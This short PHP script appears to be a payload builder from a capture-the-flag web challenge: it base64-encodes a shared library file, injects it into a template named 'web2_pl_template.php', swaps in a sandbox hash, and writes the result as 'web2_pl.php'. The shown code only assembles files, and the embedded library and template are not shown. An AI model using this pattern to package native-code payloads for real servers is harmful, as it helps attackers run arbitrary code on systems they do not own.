<?php

$so = file_get_contents("dalaodaidaiwo.so");

$so = base64_encode($so);

$pl = file_get_contents("web2_pl_template.php");

$pl = str_replace("SSSSSSSSSSSSSSSS", $so, $pl);

$sandbox = "8587c01da3ade7f025ac10068e806417";

// 8587c01da3ade7f025ac10068e806417
$pl = str_replace("8587c01da3ade7f025ac10068e806417", $sandbox, $pl);

file_put_contents("web2_pl.php", $pl);
